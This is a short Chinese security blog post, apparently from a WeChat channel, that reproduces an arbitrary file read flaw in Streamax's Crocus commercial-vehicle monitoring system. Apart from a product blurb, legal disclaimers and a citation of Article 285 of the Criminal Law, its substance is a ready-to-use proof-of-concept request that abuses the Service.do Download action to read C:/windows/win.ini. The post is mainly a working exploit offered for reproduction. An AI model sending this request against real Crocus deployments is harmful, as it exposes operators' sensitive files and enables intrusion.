#  【漏洞复现】锐明技术Crocus系统存在任意文件读取   
什么安全  什么安全   2025-02-05 01:47  
  
  请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！  
  
**产品描述**  
  
**深圳市锐明技术股份有限公司锐明技术Crocus系统融合了锐明技术的多项核心技术，如视频图像处理技术、卫星定位、物联网传感器、车载电子工程及无线通讯等，旨在为用户提供系统化、智能化的商用车监控和信息化解决方案。**  
  
**漏洞描述**  
  
**Crocus系统存在任意文件读取漏洞，攻击者可以通过该漏洞读取敏感信息。**  
  
**Poc**  
```
/Service.do?Action=Download&Path=C:/windows/win.ini
```  
  
**漏洞复现**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/w0DeFbFI15xD3t888fIS4XxMesLaYQmQzkCa8nvBYAt6mxjLmpoRohKljnticfTnApZicyUyQZfOVLXIV8hJN3Yg/640?wx_fmt=png&from=appmsg "")  
  
  
小  
知  
识  
  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声  
明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
****  
****  
